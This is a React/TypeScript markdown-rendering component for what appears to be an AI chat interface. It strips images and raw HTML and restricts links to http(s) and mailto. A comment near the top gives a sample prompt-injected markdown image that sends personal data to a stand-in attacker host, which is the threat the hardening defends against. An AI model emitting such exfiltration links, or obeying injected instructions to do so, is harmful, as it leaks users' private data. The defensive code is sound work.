"use client";

import { Children, isValidElement, type ReactNode } from "react";
import { harden } from "rehype-harden";
import { defaultRehypePlugins, Streamdown, type Components } from "streamdown";

import { useMessages } from "@/lib/i18n/context";

// Hardened per research R4: Streamdown's defaults allow raw HTML, `data:` images and any
// image prefix, so a prompt-injected `![](https://attacker/?q=<pii>)` would leak data on
// render. No `raw` plugin (raw HTML is shown as text, never parsed) and no images.
// rehype-harden matches prefixes by origin, so "any https link" is `*`; it always blocks
// javascript:, data:, file: and vbscript:, but lets irc:, xmpp: and blob: through.
// The `a` renderer below is load-bearing: it is what limits links to http(s) and mailto.
const rehypePlugins = [
  defaultRehypePlugins.sanitize,
  [
    harden,
    {
      allowedLinkPrefixes: ["*"],
      allowedImagePrefixes: [],
      allowDataImages: false,
      linkBlockPolicy: "text-only",
      imageBlockPolicy: "remove",
    },
  ],
] satisfies NonNullable<React.ComponentProps<typeof Streamdown>["rehypePlugins"]>;

const SAFE_HREF = /^(https?:|mailto:)/i;

function hasText(children: ReactNode): boolean {
  return Children.toArray(children).some((child) =>
    typeof child === "string" || typeof child === "number"
      ? String(child).trim().length > 0
      : isValidElement<{ children?: ReactNode }>(child) && hasText(child.props.children),
  );
}

const components: Components = {
  img: () => null,
  a: ({ href, children }) =>
    // A blank label would be an invisible but clickable link.
    href && SAFE_HREF.test(href) && hasText(children) ? (
      <a
        href={href}
        target="_blank"
        rel="noopener noreferrer"
        className="font-semibold break-all text-link no-underline hover:underline underline-offset-3"
      >
        {children}
      </a>
    ) : (
      <span>{children}</span>
    ),
};

type MarkdownProps = { children: string; streaming?: boolean };

export function Markdown({ children, streaming = false }: MarkdownProps) {
  const messages = useMessages();
  return (
    <Streamdown
      // `.b-mel`: 16/24 body, 8 px between blocks, links in text/link 600; the streaming caret
      // is Streamdown's block caret tinted accent/brand. Wide tables and code scroll inside.
      className="min-w-0 space-y-2 break-words [&_a]:text-link [&_li]:py-0 [&_ol]:list-outside [&_ol]:pl-5 [&_pre]:max-w-full [&_pre]:overflow-x-auto [&_strong]:font-semibold [&_table]:block [&_table]:max-w-full [&_table]:overflow-x-auto [&_ul]:list-outside [&_ul]:pl-5 [&>*:last-child]:after:text-brand"
      mode={streaming ? "streaming" : "static"}
      parseIncompleteMarkdown={streaming}
      isAnimating={streaming}
      caret="block"
      rehypePlugins={rehypePlugins}
      components={components}
      controls={false}
      linkSafety={{ enabled: false }}
      translations={messages.markdown}
    >
      {children}
    </Streamdown>
  );
}
